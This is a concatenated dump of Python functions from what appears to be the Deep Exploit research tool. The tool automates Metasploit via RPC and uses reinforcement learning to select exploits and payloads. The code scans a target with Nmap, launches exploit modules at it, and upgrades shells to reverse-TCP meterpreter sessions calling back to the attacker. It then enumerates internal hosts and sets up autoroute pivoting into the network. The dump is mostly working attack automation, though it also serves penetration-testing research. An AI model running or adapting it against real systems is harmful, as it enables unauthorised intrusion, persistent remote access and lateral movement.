        elif self.os_real == 4 and os_type in ['netware', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 5 and os_type in ['linux', 'unix', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 6 and os_type in ['irix', 'unix', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 7 and os_type in ['hpux', 'unix', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 8 and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 9 and os_type in ['firefox', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 10 and os_type in ['dialup', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 11 and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 12 and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 13 and os_type in ['android', 'linux', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 14 and os_type in ['aix', 'unix', 'multi']:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        elif self.os_real == 15:
            osmatch_module_list.append([exploit_info[0], exploit_info[2]])
    return osmatch_module_list"
13o-bbr-bbq/machine_learning_security,cutting_strings,"def cutting_strings(self, pattern, target):
    return re.findall(pattern, target)"
13o-bbr-bbq/machine_learning_security,normalization,"def normalization(self, target_idx):
    if target_idx == ST_OS_TYPE:
        os_num = int(self.state[ST_OS_TYPE])
        os_num_mean = len(self.os_type) / 2
        self.state[ST_OS_TYPE] = (os_num - os_num_mean) / os_num_mean
    if target_idx == ST_SERV_NAME:
        service_num = self.state[ST_SERV_NAME]
        service_num_mean = len(self.service_list) / 2
        self.state[ST_SERV_NAME] = (service_num - service_num_mean) / service_num_mean
    elif target_idx == ST_MODULE:
        prompt_num = self.state[ST_MODULE]
        prompt_num_mean = len(com_exploit_list) / 2
        self.state[ST_MODULE] = (prompt_num - prompt_num_mean) / prompt_num_mean"
13o-bbr-bbq/machine_learning_security,execute_nmap,"def execute_nmap(self, rhost, command, timeout):
    self.util.print_message(NOTE, 'Execute Nmap against {}'.format(rhost))
    if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
        self.util.print_message(OK, '{}'.format(command))
        self.util.print_message(OK, 'Start time: {}'.format(self.util.get_current_date()))
        _ = self.client.call('console.write', [self.client.console_id, command])
        time.sleep(3.0)
        time_count = 0
        while True:
            ret = self.client.call('console.read', [self.client.console_id])
            try:
                if time_count % 5 == 0:
                    self.util.print_message(OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                    self.client.keep_alive()
                if timeout == time_count:
                    self.client.termination(self.client.console_id)
                    self.util.print_message(OK, 'Timeout   : {}'.format(command))
                    self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                    break
                status = ret.get(b'busy')
                if status is False:
                    self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                    time.sleep(5.0)
                    break
            except Exception as e:
                self.util.print_exception(e, 'Failed: {}'.format(command))
            time.sleep(1.0)
            time_count += 1
        _ = self.client.call('console.destroy', [self.client.console_id])
        ret = self.client.call('console.create', [])
        try:
            self.client.console_id = ret.get(b'id')
        except Exception as e:
            self.util.print_exception(e, 'Failed: console.create')
            exit(1)
        _ = self.client.call('console.read', [self.client.console_id])
    else:
        self.util.print_message(OK, 'Nmap already scanned.')"
13o-bbr-bbq/machine_learning_security,get_port_list,"def get_port_list(self, nmap_result_file, rhost):
    self.util.print_message(NOTE, 'Get port list from {}.'.format(nmap_result_file))
    global com_port_list
    port_list = []
    proto_list = []
    info_list = []
    if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
        nmap_result = ''
        cat_cmd = 'cat ' + nmap_result_file + '\n'
        _ = self.client.call('console.write', [self.client.console_id, cat_cmd])
        time.sleep(3.0)
        time_count = 0
        while True:
            ret = self.client.call('console.read', [self.client.console_id])
            try:
                if self.timeout == time_count:
                    self.client.termination(self.client.console_id)
                    self.util.print_message(OK, 'Timeout: ""{}""'.format(cat_cmd))
                    break
                nmap_result += ret.get(b'data').decode('utf-8')
                status = ret.get(b'busy')
                if status is False:
                    break
            except Exception as e:
                self.util.print_exception(e, 'Failed: console.read')
            time.sleep(1.0)
            time_count += 1
        port_list = []
        proto_list = []
        info_list = []
        bs = BeautifulSoup(nmap_result, 'lxml')
        ports = bs.find_all('port')
        for (idx, port) in enumerate(ports):
            port_list.append(str(port.attrs['portid']))
            proto_list.append(port.attrs['protocol'])
            for obj_child in port.contents:
                if obj_child.name == 'service':
                    temp_info = ''
                    if 'product' in obj_child.attrs:
                        temp_info += obj_child.attrs['product'] + ' '
                    if 'version' in obj_child.attrs:
                        temp_info += obj_child.attrs['version'] + ' '
                    if 'extrainfo' in obj_child.attrs:
                        temp_info += obj_child.attrs['extrainfo']
                    if temp_info != '':
                        info_list.append(temp_info)
                    else:
                        info_list.append('unknown')
            self.util.print_message(OK, 'Getting {}/{} info: {}'.format(str(port.attrs['portid']), port.attrs['protocol'], info_list[idx]))
        if len(port_list) == 0:
            self.util.print_message(WARNING, 'No open port.')
            self.util.print_message(WARNING, 'Shutdown Deep Exploit...')
            self.client.termination(self.client.console_id)
            exit(1)
        com_port_list = port_list
        some_os = bs.find_all('osmatch')
        os_name = 'unknown'
        for obj_os in some_os:
            for obj_child in obj_os.contents:
                if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                    os_name = obj_child.attrs['osfamily'].lower()
                    break
        for (idx, os_type) in enumerate(self.os_type):
            if os_name in os_type:
                self.os_real = idx
    else:
        saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
        self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
        fin = codecs.open(saved_file, 'r', 'utf-8')
        target_tree = json.loads(fin.read().replace('\x00', ''))
        fin.close()
        key_list = list(target_tree.keys())
        for key in key_list[2:]:
            port_list.append(str(key))
        com_port_list = port_list
    return (port_list, proto_list, info_list)"
13o-bbr-bbq/machine_learning_security,get_exploit_list,"def get_exploit_list(self):
    self.util.print_message(NOTE, 'Get exploit list.')
    all_exploit_list = []
    if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False:
        self.util.print_message(OK, 'Loading exploit list from Metasploit.')
        all_exploit_list = []
        exploit_candidate_list = self.client.get_module_list('exploit')
        for (idx, exploit) in enumerate(exploit_candidate_list):
            module_info = self.client.get_module_info('exploit', exploit)
            time.sleep(0.1)
            try:
                rank = module_info[b'rank'].decode('utf-8')
                if rank in {'excellent', 'great', 'good'}:
                    all_exploit_list.append(exploit)
                    self.util.print_message(OK, '{}/{} Loaded exploit: {}'.format(str(idx + 1), len(exploit_candidate_list), exploit))
                else:
                    self.util.print_message(WARNING, ""{}/{} {} module is danger (rank: {}). Can't load."".format(str(idx + 1), len(exploit_candidate_list), exploit, rank))
            except Exception as e:
                self.util.print_exception(e, 'Failed: module.info')
                exit(1)
        self.util.print_message(OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
        fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
        for item in all_exploit_list:
            fout.write(item + '\n')
        fout.close()
        self.util.print_message(OK, 'Saved exploit list.')
    else:
        local_file = os.path.join(self.data_path, 'exploit_list.csv')
        self.util.print_message(OK, 'Loaded exploit list from : {}'.format(local_file))
        fin = codecs.open(local_file, 'r', 'utf-8')
        for item in fin:
            all_exploit_list.append(item.rstrip('\n'))
        fin.close()
    return all_exploit_list"
13o-bbr-bbq/machine_learning_security,get_payload_list,"def get_payload_list(self, module_name='', target_num=''):
    self.util.print_message(NOTE, 'Get payload list.')
    all_payload_list = []
    if os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is False or module_name != '':
        self.util.print_message(OK, 'Loading payload list from Metasploit.')
        payload_list = []
        if module_name == '':
            payload_list = self.client.get_module_list('payload')
            fout = codecs.open(os.path.join(self.data_path, 'payload_list.csv'), 'w', 'utf-8')
            for (idx, item) in enumerate(payload_list):
                time.sleep(0.1)
                self.util.print_message(OK, '{}/{} Loaded payload: {}'.format(str(idx + 1), len(payload_list), item))
                fout.write(item + '\n')
            fout.close()
            self.util.print_message(OK, 'Saved payload list.')
        elif target_num == '':
            payload_list = self.client.get_compatible_payload_list(module_name)
        else:
            payload_list = self.client.get_target_compatible_payload_list(module_name, target_num)
    else:
        local_file = os.path.join(self.data_path, 'payload_list.csv')
        self.util.print_message(OK, 'Loaded payload list from : {}'.format(local_file))
        payload_list = []
        fin = codecs.open(local_file, 'r', 'utf-8')
        for item in fin:
            payload_list.append(item.rstrip('\n'))
        fin.close()
    return payload_list"
13o-bbr-bbq/machine_learning_security,reset_state,"def reset_state(self, exploit_tree, target_tree):
    port_num = str(com_port_list[random.randint(0, len(com_port_list) - 1)])
    service_name = target_tree[port_num]['prod_name']
    if service_name == 'unknown':
        return (True, None, None, None, None)
    self.state = []
    self.os_real = target_tree['os_type']
    self.state.insert(ST_OS_TYPE, target_tree['os_type'])
    self.normalization(ST_OS_TYPE)
    for (idx, service) in enumerate(self.service_list):
        if service == service_name:
            self.state.insert(ST_SERV_NAME, idx)
            break
    self.normalization(ST_SERV_NAME)
    self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])
    module_list = target_tree[port_num]['exploit']
    module_name = ''
    module_info = []
    while True:
        module_name = module_list[random.randint(0, len(module_list) - 1)]
        for (idx, exploit) in enumerate(com_exploit_list):
            exploit = 'exploit/' + exploit
            if exploit == module_name:
                self.state.insert(ST_MODULE, idx)
                break
        self.normalization(ST_MODULE)
        break
    module_name = module_name[8:]
    target_list = exploit_tree[module_name]['target_list']
    targets_num = target_list[random.randint(0, len(target_list) - 1)]
    self.state.insert(ST_TARGET, int(targets_num))
    target_info = {'protocol': target_tree[port_num]['protocol'], 'target_path': target_tree[port_num]['target_path'], 'prod_name': service_name, 'version': target_tree[port_num]['version'], 'exploit': module_name}
    if com_indicate_flag:
        port_num = target_tree['origin_port']
    target_info['port'] = str(port_num)
    return (False, self.state, exploit_tree[module_name]['targets'][targets_num], target_list, target_info)"
13o-bbr-bbq/machine_learning_security,get_state,"def get_state(self, exploit_tree, target_tree, port_num, exploit, target):
    service_name = target_tree[port_num]['prod_name']
    if service_name == 'unknown':
        return (True, None, None, None)
    self.state = []
    self.os_real = target_tree['os_type']
    self.state.insert(ST_OS_TYPE, target_tree['os_type'])
    self.normalization(ST_OS_TYPE)
    for (idx, service) in enumerate(self.service_list):
        if service == service_name:
            self.state.insert(ST_SERV_NAME, idx)
            break
    self.normalization(ST_SERV_NAME)
    self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])
    for (idx, temp_exploit) in enumerate(com_exploit_list):
        temp_exploit = 'exploit/' + temp_exploit
        if exploit == temp_exploit:
            self.state.insert(ST_MODULE, idx)
            break
    self.normalization(ST_MODULE)
    self.state.insert(ST_TARGET, int(target))
    target_info = {'protocol': target_tree[port_num]['protocol'], 'target_path': target_tree[port_num]['target_path'], 'prod_name': service_name, 'version': target_tree[port_num]['version'], 'exploit': exploit[8:], 'target': target}
    if com_indicate_flag:
        port_num = target_tree['origin_port']
    target_info['port'] = str(port_num)
    return (False, self.state, exploit_tree[exploit[8:]]['targets'][target], target_info)"
13o-bbr-bbq/machine_learning_security,get_available_actions,"def get_available_actions(self, payload_list):
    payload_num_list = []
    for self_payload in payload_list:
        for (idx, payload) in enumerate(com_payload_list):
            if payload == self_payload:
                payload_num_list.append(idx)
                break
    return payload_num_list"
13o-bbr-bbq/machine_learning_security,show_banner_bingo,"def show_banner_bingo(self, prod_name, exploit, payload, sess_type, delay_time=2.0):
    banner = u'\n        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\u3000\u3000\u3000    ██████╗ ██╗███╗   ██╗ ██████╗  ██████╗ ██╗██╗██╗\n          ██╔══██╗██║████╗  ██║██╔════╝ ██╔═══██╗██║██║██║\n          ██████╔╝██║██╔██╗ ██║██║  ███╗██║   ██║██║██║██║\n          ██╔══██╗██║██║╚██╗██║██║   ██║██║   ██║╚═╝╚═╝╚═╝\n          ██████╔╝██║██║ ╚████║╚██████╔╝╚██████╔╝██╗██╗██╗\n          ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝╚═╝\n        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n        ' + prod_name + ' ' + exploit + ' ' + payload + ' ' + sess_type + '\n'
    self.util.print_message(NONE, banner)
    time.sleep(delay_time)"
13o-bbr-bbq/machine_learning_security,set_options,"def set_options(self, target_info, target, selected_payload, exploit_tree):
    options = exploit_tree[target_info['exploit']]['options']
    key_list = options.keys()
    option = {}
    for key in key_list:
        if options[key]['required'] is True:
            sub_key_list = options[key].keys()
            if 'default' in sub_key_list:
                if options[key]['user_specify'] == '':
                    option[key] = options[key]['default']
                else:
                    option[key] = options[key]['user_specify']
            else:
                option[key] = '0'
        if len([s for s in self.path_collection if s in key.lower()]) != 0:
            option[key] = target_info['target_path']
    option['RHOST'] = self.rhost
    if self.port_div_symbol in target_info['port']:
        tmp_port = target_info['port'].split(self.port_div_symbol)
        option['RPORT'] = int(tmp_port[0])
    else:
        option['RPORT'] = int(target_info['port'])
    option['TARGET'] = int(target)
    if selected_payload != '':
        option['PAYLOAD'] = selected_payload
    return option"
13o-bbr-bbq/machine_learning_security,execute_exploit,"def execute_exploit(self, action, thread_name, thread_type, target_list, target_info, step, exploit_tree, frame=0):
    target = ''
    if thread_type == 'learning':
        target = str(self.state[ST_TARGET])
    else:
        target = target_list
        if step > self.max_attempt - 1:
            return (self.state, None, True, {})
    selected_payload = ''
    if action != 'no payload':
        selected_payload = com_payload_list[action]
    else:
        selected_payload = ''
    option = self.set_options(target_info, target, selected_payload, exploit_tree)
    reward = 0
    message = ''
    session_list = {}
    done = False
    (job_id, uuid) = self.client.execute_module('exploit', target_info['exploit'], option)
    if uuid is not None:
        _ = self.check_running_module(job_id, uuid)
        sessions = self.client.get_session_list()
        key_list = sessions.keys()
        if len(key_list) != 0:
            for key in key_list:
                exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
                if uuid == exploit_uuid:
                    session_id = int(key)
                    session_type = sessions[key][b'type'].decode('utf-8')
                    session_port = str(sessions[key][b'session_port'])
                    session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                    session_payload = sessions[key][b'via_payload'].decode('utf-8')
                    module_info = self.client.get_module_info('exploit', session_exploit)
                    status = True
                    if status:
                        reward = R_GREAT
                        done = True
                        message = 'bingo!! '
                        self.show_banner_bingo(target_info['prod_name'], session_exploit, session_payload, session_type)
                    else:
                        reward = R_GOOD
                        message = 'misfire '
                    vuln_name = module_info[b'name'].decode('utf-8')
                    description = module_info[b'description'].decode('utf-8')
                    ref_list = module_info[b'references']
                    reference = ''
                    for item in ref_list:
                        reference += '[' + item[0].decode('utf-8') + ']' + '@' + item[1].decode('utf-8') + '@@'
                    if thread_type == 'learning':
                        with codecs.open(os.path.join(self.report_train_path, thread_name + '.csv'), 'a', 'utf-8') as fout:
                            bingo = [self.util.get_current_date(), self.rhost, session_port, target_info['protocol'], target_info['prod_name'], str(target_info['version']), vuln_name, description, session_type, session_exploit, target, session_payload, reference]
                            writer = csv.writer(fout)
                            writer.writerow(bingo)
                    else:
                        with codecs.open(os.path.join(self.report_test_path, thread_name + '.csv'), 'a', 'utf-8') as fout:
                            bingo = [self.util.get_current_date(), self.rhost, session_port, self.source_host, target_info['protocol'], target_info['prod_name'], str(target_info['version']), vuln_name, description, session_type, session_exploit, target, session_payload, reference]
                            writer = csv.writer(fout)
                            writer.writerow(bingo)
                    if thread_type == 'learning':
                        self.client.stop_session(session_id)
                        self.client.stop_meterpreter_session(session_id)
                    else:
                        session_list['id'] = session_id
                        session_list['type'] = session_type
                        session_list['port'] = session_port
                        session_list['exploit'] = session_exploit
                        session_list['target'] = target
                        session_list['payload'] = session_payload
                    break
            else:
                reward = R_BAD
                message = 'failure '
        else:
            reward = R_BAD
            message = 'failure '
    else:
        done = True
        reward = R_BAD
        message = 'time out'
    if thread_type == 'learning':
        self.util.print_message(OK, '{0:04d}/{1:04d} : {2:03d}/{3:03d} {4} reward:{5} {6} {7} ({8}/{9}) {10} | {11} | {12} | {13}'.format(frame, MAX_TRAIN_NUM, step, MAX_STEPS, thread_name, str(reward), message, self.rhost, target_info['protocol'], target_info['port'], target_info['prod_name'], target_info['exploit'], selected_payload, target))
    else:
        self.util.print_message(OK, '{0}/{1} {2} {3} ({4}/{5}) {6} | {7} | {8} | {9}'.format(step + 1, self.max_attempt, message, self.rhost, target_info['protocol'], target_info['port'], target_info['prod_name'], target_info['exploit'], selected_payload, target))
    targets_num = 0
    if thread_type == 'learning' and len(target_list) != 0:
        targets_num = random.randint(0, len(target_list) - 1)
    self.state[ST_TARGET] = targets_num
    ""\n        if thread_type == 'learning' and len(target_list) != 0:\n            if reward == R_BAD and self.state[ST_STAGE] == S_NORMAL:\n                # Change status of target.\n                self.state[ST_TARGET] = random.randint(0, len(target_list) - 1)\n            elif reward == R_GOOD:\n                # Change status of exploitation stage (Fix target).\n                self.state[ST_STAGE] = S_EXPLOIT\n            else:\n                # Change status of post-exploitation stage (Goal).\n                self.state[ST_STAGE] = S_PEXPLOIT\n        ""
    return (self.state, reward, done, session_list)"
13o-bbr-bbq/machine_learning_security,check_post_exploit,"def check_post_exploit(self, session_id, session_type):
    new_session_id = 0
    status = False
    job_id = None
    if session_type == 'shell' or session_type == 'powershell':
        (upgrade_result, job_id, lport) = self.upgrade_shell(session_id)
        if upgrade_result == 'success':
            sessions = self.client.get_session_list()
            session_list = list(sessions.keys())
            for sess_idx in session_list:
                if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                    status = True
                    new_session_id = sess_idx
                    break
        else:
            status = False
    elif session_type == 'meterpreter':
        status = True
    else:
        status = False
    return (status, job_id, new_session_id)"
13o-bbr-bbq/machine_learning_security,check_payload_type,"def check_payload_type(self, session_payload, session_type):
    status = None
    if session_type == 'shell' or session_type == 'powershell':
        if session_payload.count('/') > 1:
            status = True
        else:
            status = False
    elif session_type == 'meterpreter':
        status = True
    else:
        status = False
    return status"
13o-bbr-bbq/machine_learning_security,execute_post_exploit,"def execute_post_exploit(self, session_id, session_type):
    internal_ip_list = []
    if session_type == 'shell' or session_type == 'powershell':
        (upgrade_result, _, _) = self.upgrade_shell(session_id)
        if upgrade_result == 'success':
            sessions = self.client.get_session_list()
            session_list = list(sessions.keys())
            for sess_idx in session_list:
                if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                    self.util.print_message(NOTE, 'Successful: Upgrade.')
                    session_id = sess_idx
                    (internal_ip_list, _) = self.get_internal_ip(session_id)
                    if len(internal_ip_list) == 0:
                        self.util.print_message(WARNING, 'Internal server is not found.')
                    else:
                        self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
                        self.set_pivoting(session_id, internal_ip_list)
                    break
        else:
            self.util.print_message(WARNING, 'Failure: Upgrade session from shell to meterpreter.')
    elif session_type == 'meterpreter':
        (internal_ip_list, _) = self.get_internal_ip(session_id)
        if len(internal_ip_list) == 0:
            self.util.print_message(WARNING, 'Internal server is not found.')
        else:
            self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
            self.set_pivoting(session_id, internal_ip_list)
    else:
        self.util.print_message(WARNING, 'Unknown session type: {}.'.format(session_type))
    return internal_ip_list"
13o-bbr-bbq/machine_learning_security,upgrade_shell,"def upgrade_shell(self, session_id):
    self.util.print_message(NOTE, 'Upgrade session from shell to meterpreter.')
    payload = ''
    if self.os_real == 0:
        payload = 'windows/meterpreter/reverse_tcp'
    elif self.os_real == 3:
        payload = 'osx/x64/meterpreter_reverse_tcp'
    else:
        payload = 'linux/x86/meterpreter_reverse_tcp'
    module = 'exploit/multi/handler'
    lport = random.randint(10001, 65535)
    option = {'LHOST': self.lhost, 'LPORT': lport, 'PAYLOAD': payload, 'TARGET': 0}
    (job_id, uuid) = self.client.execute_module('exploit', module, option)
    time.sleep(0.5)
    if uuid is None:
        self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
        return ('failure', job_id, lport)
    status = self.client.upgrade_shell_session(session_id, self.lhost, lport)
    return (status, job_id, lport)"
13o-bbr-bbq/machine_learning_security,check_running_module,"def check_running_module(self, job_id, uuid):
    time_count = 0
    while True:
        job_id_list = self.client.get_job_list()
        if job_id in job_id_list:
            time.sleep(1)
        else:
            return True
        if self.timeout == time_count:
            self.client.stop_job(str(job_id))
            self.util.print_message(WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
            return False
        time_count += 1"
13o-bbr-bbq/machine_learning_security,get_internal_ip,"def get_internal_ip(self, session_id):
    self.util.print_message(OK, 'Searching internal servers...')
    cmd = 'arp\n'
    _ = self.client.execute_meterpreter(session_id, cmd)
    time.sleep(3.0)
    data = self.client.get_meterpreter_result(session_id)
    if data is None or 'unknown command' in data.lower():
        self.util.print_message(FAIL, 'Failed: Get meterpreter result')
        return ([], False)
    self.util.print_message(OK, 'Result of arp: \n{}'.format(data))
    regex_pattern = '(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}).*[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}'
    temp_list = self.cutting_strings(regex_pattern, data)
    internal_ip_list = []
    for ip_addr in temp_list:
        if ip_addr != self.lhost:
            internal_ip_list.append(ip_addr)
    return (list(set(internal_ip_list)), True)"
13o-bbr-bbq/machine_learning_security,get_subnet,"def get_subnet(self, session_id, internal_ip):
    cmd = 'run get_local_subnets\n'
    _ = self.client.execute_meterpreter(session_id, cmd)
    time.sleep(3.0)
    data = self.client.get_meterpreter_result(session_id)
    if data is not None:
        self.util.print_message(OK, 'Result of get_local_subnets: \n{}'.format(data))
        regex_pattern = '(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})'
        temp_subnet = self.cutting_strings(regex_pattern, data)
        try:
            subnets = temp_subnet[0].split('/')
            return [subnets[0], subnets[1]]
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']
    else:
        self.util.print_message(WARNING, '""{}"" is failure.'.format(cmd))
        return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']"
13o-bbr-bbq/machine_learning_security,set_pivoting,"def set_pivoting(self, session_id, ip_list):
    temp_subnet = []
    for internal_ip in ip_list:
        temp_subnet.append(self.get_subnet(session_id, internal_ip))
    for subnet in list(map(list, set(map(tuple, temp_subnet)))):
        cmd = 'run autoroute -s ' + subnet[0] + ' ' + subnet[1] + '\n'
        _ = self.client.execute_meterpreter(session_id, cmd)
        time.sleep(3.0)
        _ = self.client.execute_meterpreter(session_id, 'run autoroute -p\n')"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self):
    with tf.variable_scope('parameter_server'):
        self.model = self._build_model()
    self.weights_params = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope='parameter_server')
    self.optimizer = tf.train.RMSPropOptimizer(LEARNING_RATE, RMSPropDecaly)"
13o-bbr-bbq/machine_learning_security,_build_model,"def _build_model(self):
    l_input = Input(batch_shape=(None, NUM_STATES))
    l_dense1 = Dense(50, activation='relu')(l_input)
    l_dense2 = Dense(100, activation='relu')(l_dense1)
    l_dense3 = Dense(200, activation='relu')(l_dense2)
    l_dense4 = Dense(400, activation='relu')(l_dense3)
    out_actions = Dense(NUM_ACTIONS, activation='softmax')(l_dense4)
    out_value = Dense(1, activation='linear')(l_dense4)
    model = Model(inputs=[l_input], outputs=[out_actions, out_value])
    return model"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, name, parameter_server):
    self.util = Utilty()
    with tf.name_scope(name):
        self.train_queue = [[], [], [], [], []]
        K.set_session(SESS)
        self.model = self._build_model()
        self._build_graph(name, parameter_server)"
13o-bbr-bbq/machine_learning_security,_build_model,"def _build_model(self):
    l_input = Input(batch_shape=(None, NUM_STATES))
    l_dense1 = Dense(50, activation='relu')(l_input)
    l_dense2 = Dense(100, activation='relu')(l_dense1)
    l_dense3 = Dense(200, activation='relu')(l_dense2)
    l_dense4 = Dense(400, activation='relu')(l_dense3)
    out_actions = Dense(NUM_ACTIONS, activation='softmax')(l_dense4)
    out_value = Dense(1, activation='linear')(l_dense4)
    model = Model(inputs=[l_input], outputs=[out_actions, out_value])
    model._make_predict_function()
    return model"
13o-bbr-bbq/machine_learning_security,_build_graph,"def _build_graph(self, name, parameter_server):
    self.s_t = tf.placeholder(tf.float32, shape=(None, NUM_STATES))
    self.a_t = tf.placeholder(tf.float32, shape=(None, NUM_ACTIONS))
    self.r_t = tf.placeholder(tf.float32, shape=(None, 1))
    (p, v) = self.model(self.s_t)
    log_prob = tf.log(tf.reduce_sum(p * self.a_t, axis=1, keepdims=True) + 1e-10)
    advantage = self.r_t - v
    loss_policy = -log_prob * tf.stop_gradient(advantage)
    loss_value = LOSS_V * tf.square(advantage)
    entropy = LOSS_ENTROPY * tf.reduce_sum(p * tf.log(p + 1e-10), axis=1, keepdims=True)
    self.loss_total = tf.reduce_mean(loss_policy + loss_value + entropy)
    self.weights_params = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope=name)
    self.grads = tf.gradients(self.loss_total, self.weights_params)
    self.update_global_weight_params = parameter_server.optimizer.apply_gradients(zip(self.grads, parameter_server.weights_params))
    self.pull_global_weight_params = [l_p.assign(g_p) for (l_p, g_p) in zip(self.weights_params, parameter_server.weights_params)]
    self.push_local_weight_params = [g_p.assign(l_p) for (g_p, l_p) in zip(parameter_server.weights_params, self.weights_params)]"
13o-bbr-bbq/machine_learning_security,pull_parameter_server,"def pull_parameter_server(self):
    SESS.run(self.pull_global_weight_params)"
13o-bbr-bbq/machine_learning_security,push_parameter_server,"def push_parameter_server(self):
    SESS.run(self.push_local_weight_params)"
13o-bbr-bbq/machine_learning_security,update_parameter_server,"def update_parameter_server(self):
    if len(self.train_queue[0]) < MIN_BATCH:
        return
    self.util.print_message(NOTE, 'Update LocalBrain weight to ParameterServer.')
    (s, a, r, s_, s_mask) = self.train_queue
    self.train_queue = [[], [], [], [], []]
    s = np.vstack(s)
    a = np.vstack(a)
    r = np.vstack(r)
    s_ = np.vstack(s_)
    s_mask = np.vstack(s_mask)
    (_, v) = self.model.predict(s_)
    r = r + GAMMA_N * v * s_mask
    feed_dict = {self.s_t: s, self.a_t: a, self.r_t: r}
    SESS.run(self.update_global_weight_params, feed_dict)"
13o-bbr-bbq/machine_learning_security,predict_p,"def predict_p(self, s):
    (p, v) = self.model.predict(s)
    return p"
13o-bbr-bbq/machine_learning_security,train_push,"def train_push(self, s, a, r, s_):
    self.train_queue[0].append(s)
    self.train_queue[1].append(a)
    self.train_queue[2].append(r)
    if s_ is None:
        self.train_queue[3].append(NONE_STATE)
        self.train_queue[4].append(0.0)
    else:
        self.train_queue[3].append(s_)
        self.train_queue[4].append(1.0)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, name, parameter_server):
    self.brain = LocalBrain(name, parameter_server)
    self.memory = []
    self.R = 0.0"
13o-bbr-bbq/machine_learning_security,act,"def act(self, s, available_action_list, eps_steps):
    if frames >= eps_steps:
        eps = EPS_END
    else:
        eps = EPS_START + frames * (EPS_END - EPS_START) / eps_steps
    if random.random() < eps:
        if len(available_action_list) != 0:
            return (available_action_list[random.randint(0, len(available_action_list) - 1)], None, None)
        else:
            return ('no payload', None, None)
    else:
        s = np.array([s])
        p = self.brain.predict_p(s)
        if len(available_action_list) != 0:
            prob = []
            for action in available_action_list:
                prob.append([action, p[0][action]])
            prob.sort(key=lambda s: -s[1])
            return (prob[0][0], prob[0][1], prob)
        else:
            return ('no payload', p[0][len(p[0]) - 1], None)"
13o-bbr-bbq/machine_learning_security,advantage_push_local_brain,"def advantage_push_local_brain(self, s, a, r, s_):

    def get_sample(memory, n):
        (s, a, _, _) = memory[0]
        (_, _, _, s_) = memory[n - 1]
        return (s, a, self.R, s_)
    a_cats = np.zeros(NUM_ACTIONS)
    a_cats[a] = 1
    self.memory.append((s, a_cats, r, s_))
    self.R = (self.R + r * GAMMA_N) / GAMMA
    if s_ is None:
        while len(self.memory) > 0:
            n = len(self.memory)
            (s, a, r, s_) = get_sample(self.memory, n)
            self.brain.train_push(s, a, r, s_)
            self.R = (self.R - self.memory[0][2]) / GAMMA
            self.memory.pop(0)
        self.R = 0
    if len(self.memory) >= N_STEP_RETURN:
        (s, a, r, s_) = get_sample(self.memory, N_STEP_RETURN)
        self.brain.train_push(s, a, r, s_)
        self.R = self.R - self.memory[0][2]
        self.memory.pop(0)"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, name, thread_type, parameter_server, rhost):
    self.name = name
    self.thread_type = thread_type
    self.env = Metasploit(rhost)
    self.agent = Agent(name, parameter_server)
    self.util = Utilty()"
13o-bbr-bbq/machine_learning_security,run,"def run(self, exploit_tree, target_tree):
    self.agent.brain.pull_parameter_server()
    global frames
    global isFinish
    global exploit_count
    global post_exploit_count
